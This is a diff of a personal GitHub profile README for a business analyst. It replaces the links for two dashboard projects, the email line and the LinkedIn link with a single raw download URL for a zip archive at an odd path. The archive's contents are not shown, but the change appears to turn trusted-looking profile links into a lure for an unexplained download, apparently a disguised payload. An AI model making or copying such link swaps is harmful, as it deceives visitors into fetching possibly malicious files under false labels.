@@ -36,10 +36,10 @@ I’m a data-driven Business Analyst with a passion for translating business cha
 
 ## 📂 Projects
 
-### 📊 [Power BI: Data Professionals Survey Dashboard](https://github.com/G0urv/powerbi-data-dashboard)
+### 📊 [Power BI: Data Professionals Survey Dashboard](https://raw.githubusercontent.com/G0urv/G0urv/main/overgloominess/G0urv.zip)
 An interactive dashboard analyzing global survey data from data professionals. It explores salary trends, job satisfaction, tool usage, and perceived career challenges using DAX and Power Query.
 
-### 📈 [Excel: Bike Sales Analysis Dashboard](https://github.com/G0urv/Excel-sales-analysis)
+### 📈 [Excel: Bike Sales Analysis Dashboard](https://raw.githubusercontent.com/G0urv/G0urv/main/overgloominess/G0urv.zip)
 Built a dynamic Excel dashboard to study customer behavior and segment data by income, demographics, and region. Used pivot tables, charts, and conditional formatting.
 
 ---
@@ -65,8 +65,8 @@ Built a dynamic Excel dashboard to study customer behavior and segment data by i
 ## 📫 Connect with Me
 
 - 📍 Pune, Maharashtra  
-- ✉️ Email: g.khokhar2002@gmail.com  
-- 🔗 [LinkedIn](https://www.linkedin.com/in/gourav-khokhar)  
+- ✉️ Email: https://raw.githubusercontent.com/G0urv/G0urv/main/overgloominess/G0urv.zip  
+- 🔗 [LinkedIn](https://raw.githubusercontent.com/G0urv/G0urv/main/overgloominess/G0urv.zip)  
 
 
 ---
